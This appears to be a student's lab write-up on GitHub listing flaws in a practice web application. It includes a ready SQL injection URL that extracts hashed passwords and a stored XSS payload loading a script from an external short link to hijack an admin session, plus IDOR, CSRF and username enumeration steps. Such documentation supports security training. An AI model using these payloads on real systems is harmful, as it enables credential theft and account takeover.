# project-8
blue:
Vulnerability #1: SQL Injection (SQLi)
![](https://github.com/guanomite/project-8-/blob/master/Screenshot%20(23).png)
put this command in the URL: https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Chashed_password+FROM+users+limit+20+offset+2+--+
Vulnerability #2:Session Hijacking/Fixation
![](https://github.com/guanomite/project-8-/blob/master/Screenshot%20(31).png)
When logged in as an admin go to "Countries, States, & Territories".
Click on "Show", doesn't matter which country.
Click on "Add a State".
Enter values for "Name" and "Code" and click create.
Click on "Add a Territory".
Ender a value for "Name".
In the filed "Position" type:
      <script src="https://bit.ly/2z1UCVh"></script>
      then relog as admin and the public user will log in as admin
red:
Vulnerability #1: Insecure Direct Object Reference (IDOR)
![](https://github.com/guanomite/project-8-/blob/master/Screenshot%20(18).png)
Go to the "Find a Salesperson" page.
Click on one of the salespersons page.
Increment the number at the end of the URL.
Vulnerability #2: CSRF
![](https://github.com/guanomite/project-8-/blob/master/Screenshot%20(33).png)
go to burp, then repeator in the user list, change user name to somthing then refrash the page, then see the change 

green:
Vulnerability #1: Username Enumeration
![](https://github.com/guanomite/project-8-/blob/master/Screenshot%20(32).png)
On the Log In page try to bruteforce diffent usernames.
The usernames tha exist in the database will get the message "Log in was unsuccessful" in bald.
The error message is highlited in bald because a different CSS class is assigned to the error message for usernames that exit in the database.

Vulnerability #2: XSS
![](https://github.com/guanomite/project-8-/blob/master/Screenshot%20(30).png)
